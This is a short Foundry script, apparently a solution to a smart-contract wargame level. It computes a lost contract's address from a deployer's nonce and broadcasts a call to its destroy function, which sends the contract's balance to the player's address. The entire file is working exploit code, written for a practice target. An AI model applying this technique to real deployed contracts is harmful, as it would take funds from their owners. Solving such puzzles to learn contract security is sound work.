import "forge-std/Script.sol";

contract RecoveryScript is Script {
    function run() external {
        address deployer = 0x6f405362D698Bd6F6DA3183386f4532b8C4b70fC;
        uint64 nonce = vm.getNonce(deployer);
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address predicted = vm.computeCreateAddress(deployer, nonce - 1);
        address player = vm.addr(privateKey);
        vm.startBroadcast(privateKey);
        (bool success,) = predicted.call(abi.encodeWithSignature("destroy(address)", player));
        require(success, "Call failed");
        vm.stopBroadcast();
    }
}
